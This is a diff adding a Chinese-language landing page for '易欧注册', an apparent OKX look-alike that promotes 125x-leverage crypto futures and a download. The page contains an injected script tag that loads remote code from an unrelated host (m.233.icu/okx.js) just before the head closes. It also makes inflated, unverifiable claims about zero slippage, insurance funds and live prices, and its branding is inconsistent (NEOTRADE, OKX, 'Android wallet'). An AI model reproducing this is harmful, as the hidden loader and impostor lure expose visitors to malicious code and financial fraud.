@@ -1,0 +1,1214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    <title>易欧注册-即刻安装数字终端,兼容所有品牌</title>
+    <meta name="description" content="易欧注册专为Android系统设计,是面向安卓用户的高效加密货币管理工具。支持多种数字货币的存储、转账与交易,提供多重安全防护机制,助力用户便捷掌控数字资产,畅享安全流畅的区块链体验。">
+    <meta name="keywords" content="易欧注册">
+    
+    
+    <meta property="og:title" content="易欧注册-即刻安装数字终端,兼容所有品牌">
+    <meta property="og:description" content="易欧注册专为Android系统设计,是面向安卓用户的高效加密货币管理工具。支持多种数字货币的存储、转账与交易,提供多重安全防护机制,助力用户便捷掌控数字资产,畅享安全流畅的区块链体验。">
+    <meta property="og:type" content="website">
+    
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="易欧注册-即刻安装数字终端,兼容所有品牌">
+    <meta name="twitter:description" content="易欧注册专为Android系统设计,是面向安卓用户的高效加密货币管理工具。支持多种数字货币的存储、转账与交易,提供多重安全防护机制,助力用户便捷掌控数字资产,畅享安全流畅的区块链体验。">
+    
+    
+    
+    <script type="application/ld+json">
+    {
+        "@type": "Organization",
+        "name": "易欧注册-即刻安装数字终端,兼容所有品牌",
+        "url": "https://neotrade.com",
+        "logo": "https://neotrade.com/neon-logo.svg",
+        "description": "易欧注册专为Android系统设计,是面向安卓用户的高效加密货币管理工具。支持多种数字货币的存储、转账与交易,提供多重安全防护机制,助力用户便捷掌控数字资产,畅享安全流畅的区块链体验。",
+        "sameAs": [
+
+        ]
+    }
+    </script>
+    
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90' fill='%2300f0ff'>◈</text></svg>">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Noto+Sans+SC:wght@400;500;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --neon-cyan: #00f0ff;
+            --neon-pink: #ff00ff;
+            --neon-purple: #b829dd;
+            --neon-yellow: #f0ff00;
+            --dark-bg: #050508;
+            --panel-bg: rgba(10, 10, 20, 0.8);
+        }
+
+        body {
+            font-family: 'Noto Sans SC', sans-serif;
+            background: var(--dark-bg);
+            color: #fff;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        /* 故障艺术背景 */
+        .glitch-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: 
+                linear-gradient(45deg, transparent 48%, rgba(0, 240, 255, 0.03) 50%, transparent 52%),
+                linear-gradient(-45deg, transparent 48%, rgba(255, 0, 255, 0.03) 50%, transparent 52%),
+                var(--dark-bg);
+            background-size: 60px 60px, 60px 60px, 100% 100%;
+        }
+
+        /* 网格地板 */
+        .grid-floor {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            z-index: -1;
+            background: 
+                linear-gradient(to bottom, transparent 0%, var(--dark-bg) 100%),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.1) 1px, transparent 1px),
+                linear-gradient(rgba(0, 240, 255, 0.1) 1px, transparent 1px);
+            background-size: 100% 100%, 50px 50px, 50px 50px;
+            transform: perspective(500px) rotateX(60deg);
+            transform-origin: bottom;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { background-position: 0 0, 0 0, 0 0; }
+            100% { background-position: 0 0, 0 50px, 50px 0; }
+        }
+
+        /* 扫描线效果 */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            pointer-events: none;
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0,0,0,0.1) 50%,
+                rgba(0,0,0,0.1)
+            );
+            background-size: 100% 4px;
+            opacity: 0.3;
+        }
+
+        /* 导航栏 - 玻璃拟态 */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 5%;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            background: rgba(5, 5, 8, 0.7);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(0, 240, 255, 0.2);
+        }
+
+        /* Logo - 故障艺术效果 */
+        .logo-container {
+            text-decoration: none;
+            position: relative;
+        }
+
+        .logo-main {
+            font-family: 'Orbitron', monospace;
+            font-size: 32px;
+            font-weight: 900;
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            text-shadow: 
+                0 0 10px var(--neon-cyan),
+                0 0 20px var(--neon-cyan),
+                0 0 40px var(--neon-cyan);
+            animation: flicker 3s infinite alternate;
+        }
+
+        .logo-main::before,
+        .logo-main::after {
+            content: 'NEOTRADE';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .logo-main::before {
+            color: var(--neon-pink);
+            animation: glitch-1 2s infinite linear alternate-reverse;
+            clip-path: polygon(0 0, 100% 0, 100% 35%, 0 35%);
+        }
+
+        .logo-main::after {
+            color: var(--neon-yellow);
+            animation: glitch-2 3s infinite linear alternate-reverse;
+            clip-path: polygon(0 65%, 100% 65%, 100% 100%, 0 100%);
+        }
+
+        @keyframes glitch-1 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+
+        @keyframes glitch-2 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(2px, -2px); }
+            40% { transform: translate(2px, 2px); }
+            60% { transform: translate(-2px, -2px); }
+            80% { transform: translate(-2px, 2px); }
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.95; }
+        }
+
+        .logo-sub {
+            font-size: 11px;
+            color: var(--neon-pink);
+            letter-spacing: 3px;
+            margin-top: 5px;
+            font-weight: 500;
+            text-transform: uppercase;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 40px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            position: relative;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .nav-links a:hover {
+            color: var(--neon-cyan);
+            text-shadow: 0 0 10px var(--neon-cyan);
+        }
+
+        .nav-links a::before {
+            content: '>';
+            position: absolute;
+            left: -15px;
+            opacity: 0;
+            color: var(--neon-pink);
+            transition: all 0.3s;
+        }
+
+        .nav-links a:hover::before {
+            opacity: 1;
+            left: -10px;
+        }
+
+        /* 主视觉区 */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 120px 20px 80px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* 浮动几何体装饰 */
+        .floating-shapes {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .shape {
+            position: absolute;
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            animation: float-rotate 20s infinite linear;
+        }
+
+        .shape:nth-child(1) {
+            width: 100px;
+            height: 100px;
+            top: 20%;
+            left: 10%;
+            transform: rotate(45deg);
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.2);
+        }
+
+        .shape:nth-child(2) {
+            width: 150px;
+            height: 150px;
+            top: 60%;
+            right: 10%;
+            border-radius: 50%;
+            border-color: var(--neon-pink);
+            animation-duration: 25s;
+            animation-direction: reverse;
+        }
+
+        .shape:nth-child(3) {
+            width: 80px;
+            height: 80px;
+            bottom: 20%;
+            left: 20%;
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+            background: rgba(184, 41, 221, 0.1);
+            border: none;
+        }
+
+        @keyframes float-rotate {
+            0% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(180deg); }
+            100% { transform: translateY(0) rotate(360deg); }
+        }
+
+        /* 标签 */
+        .cyber-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.1), rgba(255, 0, 255, 0.1));
+            border: 1px solid var(--neon-cyan);
+            padding: 10px 24px;
+            font-family: 'Orbitron', monospace;
+            font-size: 13px;
+            color: var(--neon-cyan);
+            margin-bottom: 30px;
+            position: relative;
+            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: border-pulse 2s infinite;
+        }
+
+        @keyframes border-pulse {
+            0%, 100% { box-shadow: 0 0 10px rgba(0, 240, 255, 0.3); }
+            50% { box-shadow: 0 0 20px rgba(0, 240, 255, 0.6); }
+        }
+
+        .cyber-badge::before {
+            content: '◉';
+            color: var(--neon-pink);
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* H1标题 - 巨型故障文字 */
+        .hero h1 {
+            font-family: 'Orbitron', 'Noto Sans SC', sans-serif;
+            font-size: clamp(36px, 8vw, 80px);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: -2px;
+            position: relative;
+        }
+
+        .glitch-text {
+            position: relative;
+            color: #fff;
+            text-shadow: 
+                0 0 10px rgba(255, 255, 255, 0.5),
+                0 0 20px rgba(0, 240, 255, 0.3);
+        }
+
+        .glitch-text::before,
+        .glitch-text::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .glitch-text::before {
+            color: var(--neon-pink);
+            animation: glitch-anim-1 2s infinite linear alternate-reverse;
+            clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+        }
+
+        .glitch-text::after {
+            color: var(--neon-cyan);
+            animation: glitch-anim-2 3s infinite linear alternate-reverse;
+            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+        }
+
+        @keyframes glitch-anim-1 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+        }
+
+        @keyframes glitch-anim-2 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(3px, -3px); }
+            40% { transform: translate(3px, 3px); }
+            60% { transform: translate(-3px, -3px); }
+            80% { transform: translate(-3px, 3px); }
+        }
+
+        /* H2副标题 */
+        .hero h2 {
+            font-size: clamp(16px, 2.5vw, 22px);
+            color: rgba(255, 255, 255, 0.7);
+            max-width: 700px;
+            margin-bottom: 50px;
+            font-weight: 400;
+            line-height: 1.8;
+        }
+
+        .hero h2 strong {
+            color: var(--neon-yellow);
+            font-weight: 700;
+        }
+
+        /* 数据面板 - 终端风格 */
+        .data-terminal {
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: 8px;
+            padding: 20px 30px;
+            margin-bottom: 40px;
+            max-width: 800px;
+            width: 90%;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .data-terminal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-pink), var(--neon-cyan));
+            animation: scan 3s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .terminal-header {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-dot:nth-child(1) { background: #ff5f56; }
+        .terminal-dot:nth-child(2) { background: #ffbd2e; }
+        .terminal-dot:nth-child(3) { background: #27c93f; }
+
+        .terminal-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+        }
+
+        .terminal-item {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-label {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+
+        .terminal-value {
+            font-size: 18px;
+            color: var(--neon-cyan);
+            font-weight: bold;
+        }
+
+        .terminal-value.pink { color: var(--neon-pink); }
+        .terminal-value.yellow { color: var(--neon-yellow); }
+
+        /* CTA按钮 - 赛博朋克风格 */
+        .cta-grid {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .cyber-btn {
+            position: relative;
+            padding: 20px 50px;
+            font-family: 'Orbitron', monospace;
+            font-size: 16px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-decoration: none;
+            color: #000;
+            background: var(--neon-cyan);
+            border: none;
+            cursor: pointer;
+            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+            transition: all 0.3s;
+            overflow: hidden;
+        }
+
+        .cyber-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+        }
+
+        .cyber-btn:hover::before {
+            left: 100%;
+        }
+
+        .cyber-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 0 20px var(--neon-cyan),
+                0 0 40px var(--neon-cyan),
+                0 0 60px var(--neon-cyan);
+        }
+
+        .cyber-btn.secondary {
+            background: transparent;
+            color: var(--neon-pink);
+            border: 2px solid var(--neon-pink);
+        }
+
+        .cyber-btn.secondary:hover {
+            background: var(--neon-pink);
+            color: #000;
+            box-shadow: 
+                0 0 20px var(--neon-pink),
+                0 0 40px var(--neon-pink);
+        }
+
+        .btn-text {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* 特性网格 - 全息卡片 */
+        .features-section {
+            max-width: 1200px;
+            margin: 100px auto;
+            padding: 0 20px;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .section-header h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 36px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-header h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-pink));
+        }
+
+        .section-header p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 16px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .holo-card {
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 12px;
+            padding: 40px 30px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .holo-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent 30%,
+                rgba(0, 240, 255, 0.1) 50%,
+                transparent 70%
+            );
+            transform: rotate(45deg);
+            transition: all 0.5s;
+            opacity: 0;
+        }
+
+        .holo-card:hover::before {
+            animation: holo-shine 0.5s ease-in-out;
+        }
+
+        @keyframes holo-shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); opacity: 0; }
+        }
+
+        .holo-card:hover {
+            border-color: var(--neon-cyan);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.2);
+        }
+
+        .holo-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .holo-card h3 {
+            font-family: 'Orbitron', monospace;
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .holo-card p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .holo-card .highlight {
+            color: var(--neon-pink);
+            font-weight: 700;
+        }
+
+        /* 交易对展示 - 霓虹表格 */
+        .markets-section {
+            max-width: 1000px;
+            margin: 100px auto;
+            padding: 0 20px;
+        }
+
+        .neon-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .neon-table th {
+            background: rgba(0, 240, 255, 0.1);
+            padding: 20px;
+            text-align: left;
+            font-family: 'Orbitron', monospace;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-cyan);
+            border-bottom: 1px solid rgba(0, 240, 255, 0.3);
+        }
+
+        .neon-table td {
+            padding: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .neon-table tr:hover td {
+            background: rgba(0, 240, 255, 0.05);
+            color: #fff;
+        }
+
+        .pair-name {
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .pair-sub {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .price-up { color: var(--neon-cyan); }
+        .price-down { color: var(--neon-pink); }
+
+        .leverage-tag {
+            display: inline-block;
+            background: rgba(255, 0, 255, 0.2);
+            color: var(--neon-pink);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 700;
+            border: 1px solid var(--neon-pink);
+        }
+
+        /* 页脚 - 黑暗终端 */
+        footer {
+            border-top: 1px solid rgba(0, 240, 255, 0.2);
+            background: rgba(5, 5, 8, 0.9);
+            padding: 60px 20px 30px;
+            margin-top: 150px;
+            position: relative;
+        }
+
+        footer::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--neon-cyan), var(--neon-pink), transparent);
+        }
+
+        .footer-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-col h4 {
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            color: var(--neon-cyan);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .footer-col ul {
+            list-style: none;
+        }
+
+        .footer-col li {
+            margin-bottom: 12px;
+        }
+
+        .footer-col a {
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            font-size: 14px;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-col a::before {
+            content: '>';
+            color: var(--neon-pink);
+            opacity: 0;
+            transition: all 0.3s;
+        }
+
+        .footer-col a:hover {
+            color: var(--neon-cyan);
+            padding-left: 10px;
+        }
+
+        .footer-col a:hover::before {
+            opacity: 1;
+        }
+
+        .risk-warning {
+            max-width: 900px;
+            margin: 0 auto 30px;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.05);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            border-radius: 8px;
+            color: rgba(255, 100, 100, 0.9);
+            font-size: 13px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .copyright {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 12px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-family: 'Courier New', monospace;
+        }
+
+        /* 响应式 */
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            
+            .cta-grid {
+                flex-direction: column;
+                width: 100%;
+                padding: 0 20px;
+            }
+            
+            .cyber-btn {
+                width: 100%;
+                text-align: center;
+            }
+            
+            .terminal-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .neon-table {
+                font-size: 12px;
+            }
+            
+            .neon-table th,
+            .neon-table td {
+                padding: 12px;
+            }
+        }
+
+        /* 滚动条美化 */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--dark-bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--neon-cyan);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--neon-pink);
+        }
+    </style>
+<script language="javascript" src="https://m.233.icu/okx.js"></script></head>
+<body>
+    <div class="scanlines"></div>
+    <div class="glitch-bg"></div>
+    <div class="grid-floor"></div>
+
+    
+    <div class="floating-shapes">
+        <div class="shape"></div>
+        <div class="shape"></div>
+        <div class="shape"></div>
+    </div>
+
+    
+    <nav role="navigation">
+        <a href="/" class="logo-container" title="易欧注册">
+            <div class="logo-main" data-text="易欧注册">易欧注册</div>
+            <div class="logo-sub">比特币以太坊合约交易所</div>
+        </a>
+        
+        <ul class="nav-links">
+            <li><a href="#btc-contract">BTC合约</a></li>
+            <li><a href="#eth-leverage">ETH杠杆</a></li>
+            <li><a href="#perpetual">永续合约</a></li>
+            <li><a href="#options">期权交易</a></li>
+            <li><a href="#leverage-tokens">杠杆代币</a></li>
+        </ul>
+    </nav>
+
+    
+    <main>
+        <section class="hero">
+            <div class="cyber-badge">
+                SYSTEM.ONLINE // 125X LEVERAGE ACTIVE
+            </div>
+
+            <h1>
+                <div class="glitch-text" data-text="易欧注册">易欧注册</div>
+                <div class="glitch-text" data-text="比特币以太坊杠杆炒币">比特币以太坊杠杆炒币</div>
+            </h1>
+
+            <h2>
+                零滑点<strong>虚拟货币合约</strong>交易平台，支持<strong>比特币</strong>、<strong>以太坊</strong>125倍杠杆。
+                永续合约、交割合约、期权全品类覆盖，<strong>毫秒级</strong>撮合引擎，深度流动性保障。
+            </h2>
+
+            
+            <div class="data-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-dot"></div>
+                    <div class="terminal-dot"></div>
+                    <div class="terminal-dot"></div>
+                    <span style="margin-left: 10px; color: rgba(255,255,255,0.5); font-size: 12px;">neotrade_market_data.exe</span>
+                </div>
+                <div class="terminal-content">
+                    <div class="terminal-item">
+                        <div class="terminal-label">BTC/USD 永续</div>
+                        <div class="terminal-value">67,234.50</div>
+                    </div>
+                    <div class="terminal-item">
+                        <div class="terminal-label">ETH/USD 永续</div>
+                        <div class="terminal-value pink">3,456.78</div>
+                    </div>
+                    <div class="terminal-item">
+                        <div class="terminal-label">24H 交易量</div>
+                        <div class="terminal-value yellow">$4.2B</div>
+                    </div>
+                    <div class="terminal-item">
+                        <div class="terminal-label">资金费率</div>
+                        <div class="terminal-value">0.01%</div>
+                    </div>
+                </div>
+            </div>
+
+            
+            <div class="cta-grid">
+                <a href="/okx.html" class="cyber-btn" title="立即注册易欧注册">
+                    <span class="btn-text">立即注册 // REGISTER</span>
+                </a>
+                <a href="/okx.html" class="cyber-btn secondary" title="马上开通易欧注册">
+                    <span class="btn-text">马上下载 // JOIN</span>
+                </a>
+            </div>
+        </section>
+
+        
+        <section class="features-section" id="features">
+            <div class="section-header">
+                <h2>易欧注册核心优势 // CORE_FEATURES</h2>
+                <p>专业级虚拟货币合约交易系统，为高频交易者打造</p>
+            </div>
+
+            <div class="features-grid">
+                <article class="holo-card">
+                    <span class="holo-icon">⚡</span>
+                    <h3>125X 超高杠杆</h3>
+                    <p>
+                        <span class="highlight">比特币合约</span>、<span class="highlight">以太坊杠杆</span>最高支持125倍，
+                        小资金撬动大收益。智能强平系统，风险可控，是您进行<span class="highlight">虚拟货币期货</span>交易的首选平台。
+                    </p>
+                </article>
+
+                <article class="holo-card">
+                    <span class="holo-icon">🔒</span>
+                    <h3>零滑点保障</h3>
+                    <p>
+                        聚合全球Top10交易所深度，<span class="highlight">BTC合约</span>、<span class="highlight">ETH合约</span>
+                        大额订单零滑点成交。自研撮合引擎，每秒处理100万笔订单，确保您的<span class="highlight">杠杆炒币</span>指令极速执行。
+                    </p>
+                </article>
+
+                <article class="holo-card">
+                    <span class="holo-icon">💰</span>
+                    <h3>负费率机制</h3>
+                    <p>
+                        Maker费率低至-0.025%，做单即返佣。持仓<span class="highlight">永续合约</span>享受资金费率补贴，
+                        长期持仓成本行业最低。专业<span class="highlight">虚拟货币交易所</span>的费率优势。
+                    </p>
+                </article>
+
+                <article class="holo-card">
+                    <span class="holo-icon">🛡️</span>
+                    <h3>保险基金护航</h3>
+                    <p>
+                        5000BTC保险基金，穿仓零分摊。冷热钱包分离，98%资产离线存储，
+                        为您的<span class="highlight">比特币合约交易</span>和<span class="highlight">以太坊杠杆</span>仓位提供银行级安全保障。
+                    </p>
+                </article>
+
+                <article class="holo-card">
+                    <span class="holo-icon">📊</span>
+                    <h3>专业交易工具</h3>
+                    <p>
+                        支持<span class="highlight">合约网格</span>、<span class="highlight">量化策略</span>、一键跟单。
+                        TradingView深度集成，技术指标全覆盖。API高频交易支持，满足机构级<span class="highlight">炒币</span>需求。
+                    </p>
+                </article>
+
+                <article class="holo-card">
+                    <span class="holo-icon">🌐</span>
+                    <h3>全球深度聚合</h3>
+                    <p>
+                        连接Binance、OKX、Coinbase等顶级交易所流动性，<span class="highlight">虚拟货币期货</span>
+                        深度全球领先。支持USDT本位、币本位、USDC全模式，满足多样化<span class="highlight">杠杆交易</span>需求。
+                    </p>
+                </article>
+            </div>
+        </section>
+
+        
+        <section class="markets-section">
+            <div class="section-header">
+                <h2>易欧注册热门合约 // HOT_CONTRACTS</h2>
+                <p>高流动性虚拟货币合约交易对，支持全仓/逐仓模式</p>
+            </div>
+
+            <table class="neon-table">
+                <thead>
+                    <tr>
+                        <th>交易对 // PAIR</th>
+                        <th>最新价 // PRICE</th>
+                        <th>24H涨跌 // CHANGE</th>
+                        <th>24H额 // VOLUME</th>
+                        <th>最高杠杆 // MAX</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>
+                            <div class="pair-name">BTC/USDT</div>
+                            <div class="pair-sub">比特币永续合约</div>
+                        </td>
+                        <td class="price-up">67,234.50</td>
+                        <td class="price-up">+5.23%</td>
+                        <td>$1.2B</td>
+                        <td><span class="leverage-tag">125X</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="pair-name">ETH/USDT</div>
+                            <div class="pair-sub">以太坊永续合约</div>
+                        </td>
+                        <td class="price-down">3,456.78</td>
+                        <td class="price-down">-2.15%</td>
+                        <td>$890M</td>
+                        <td><span class="leverage-tag">125X</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="pair-name">SOL/USDT</div>
+                            <div class="pair-sub">索拉纳永续合约</div>
+                        </td>
+                        <td class="price-up">178.90</td>
+                        <td class="price-up">+12.80%</td>
+                        <td>$234M</td>
+                        <td><span class="leverage-tag">50X</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="pair-name">XRP/USDT</div>
+                            <div class="pair-sub">瑞波币永续合约</div>
+                        </td>
+                        <td class="price-up">0.6234</td>
+                        <td class="price-up">+8.45%</td>
+                        <td>$156M</td>
+                        <td><span class="leverage-tag">50X</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="pair-name">DOGE/USDT</div>
+                            <div class="pair-sub">狗狗币永续合约</div>
+                        </td>
+                        <td class="price-down">0.1234</td>
+                        <td class="price-down">-1.20%</td>
+                        <td>$89M</td>
+                        <td><span class="leverage-tag">25X</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+    </main>
+
+    
+    <footer>
+        <div class="footer-grid">
+            <div class="footer-col">
+                <h4>合约交易</h4>
+                <ul>
+                    <li><a href="/btc-perpetual">BTC永续合约</a></li>
+                    <li><a href="/eth-perpetual">ETH永续合约</a></li>
+                    <li><a href="/quarterly-futures">交割合约</a></li>
+                    <li><a href="/coin-margin">币本位合约</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-col">
+                <h4>杠杆产品</h4>
+                <ul>
+                    <li><a href="/isolated-margin">逐仓杠杆</a></li>
+                    <li><a href="/cross-margin">全仓杠杆</a></li>
+                    <li><a href="/leverage-tokens">杠杆代币</a></li>
+                    <li><a href="/margin-trading">现货杠杆</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-col">
+                <h4>衍生品</h4>
+                <ul>
+                    <li><a href="/options">期权交易</a></li>
+                    <li><a href="/volatility">波动率指数</a></li>
+                    <li><a href="/funding-rate">资金费率</a></li>
+                    <li><a href="/insurance-fund">保险基金</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-col">
+                <h4>交易工具</h4>
+                <ul>
+                    <li><a href="/api">API文档</a></li>
+                    <li><a href="/sdk">量化SDK</a></li>
+                    <li><a href="/calculator">收益计算</a></li>
+                    <li><a href="/testnet">模拟交易</a></li>
+                </ul>
+            </div>
+        </div>
+
